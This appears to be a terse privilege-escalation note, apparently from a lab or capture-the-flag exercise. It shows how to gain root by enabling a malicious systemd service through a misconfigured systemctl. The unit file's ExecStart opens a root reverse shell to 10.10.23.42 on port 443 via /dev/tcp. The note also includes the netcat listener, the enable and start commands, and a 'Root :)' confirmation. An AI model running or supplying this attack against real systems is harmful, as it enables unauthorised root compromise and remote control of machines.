cd /dev/shm
gedit root.service
#### nc -lvnp 443

/bin/systemctl enable /dev/shm/root.service
Created symlink from /etc/systemd/system/multi-user.target.wants/root.service to /dev/shm/root.service
Created symlink from /etc/systemd/system/root.service -> /dev/shm/root.service

/bin/systemctl start root

Root :)

```sh
[Unit]
Description=roooooooooot

[Service]
Type=simple
User=root
ExecStart=/bin/bash -c 'bash -i >& /dev/tcp/10.10.23.42/443 0>&1'

[Install]
WantedBy=multi-user.target
```
